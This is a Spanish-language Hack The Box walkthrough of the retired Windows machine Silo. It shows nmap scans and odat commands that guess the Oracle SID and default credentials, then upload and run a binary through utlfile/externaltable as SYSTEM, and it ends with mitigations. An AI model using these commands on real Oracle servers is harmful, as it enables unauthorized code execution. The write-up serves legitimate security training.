---
machine: Silo
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, oracle, odat, utlfile, system]
---

# Silo — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Oracle Database 11g XE escucha en 1521. `odat` enumera el SID `XE`, prueba credenciales por defecto y usa `utlfile`/`externaltable` para ejecutar comandos. El servicio Oracle corre como SYSTEM, así que la escalada es inmediata.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80,135,139,445,1521 <IP>
```

- IIS, RPC, SMB y Oracle TNS 11.2.0.2.0.
- El banner de Oracle es el punto de partida.

## Enumeración

```bash
odat sidguesser -s <IP> -p 1521
odat passwordguesser -s <IP> -p 1521 -d XE --accounts-file accounts.txt
```

`XE` es el SID por defecto de Express Edition. Las credenciales clásicas de ejemplo permiten autenticarse.

## Foothold

```bash
odat utlfile -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --putFile C:\\ temp cmd.exe
odat externaltable -s <IP> -p 1521 -d XE -U <USER> -P <PASSWORD> --sysdba --exec C:\\ temp cmd.exe
```

La base ejecuta el binario a través del servicio Oracle, que en Windows corre como `NT AUTHORITY\SYSTEM`.

## Movimiento lateral

No hay pivote. Se confirma el contexto y se recogen las flags.

## Escalada de privilegios

El propio servicio ya es SYSTEM. Si se necesita una shell interactiva, se sube un ejecutable de reverse shell y se lanza con `externaltable`.

```bash
whoami
hostname
```

## Evidencia

- `odat sidguesser` con `XE`.
- Login válido con credenciales redactadas.
- `whoami` como SYSTEM.
- Transferencia y ejecución del binario.

## Lecciones aprendidas

- Una base de datos expuesta puede ser ejecución de código.
- Los SID y credenciales por defecto siguen existiendo.
- El privilegio del servicio define el impacto.

## Mitigaciones y detección

- No exponer 1521 a redes no confiables.
- Cambiar credenciales por defecto y deshabilitar cuentas de ejemplo.
- Ejecutar Oracle con una cuenta de servicio de bajo privilegio.
- Alertar de `utlfile`, `externaltable` y conexiones a TNS desde hosts no inventariados.

## Referencias

- <https://www.hackthebox.com/machines/Silo>
- <https://0xdf.gitlab.io/2018/08/04/htb-silo.html>
- <https://github.com/quentinhardy/odat>
- <https://attack.mitre.org/techniques/T1190/>
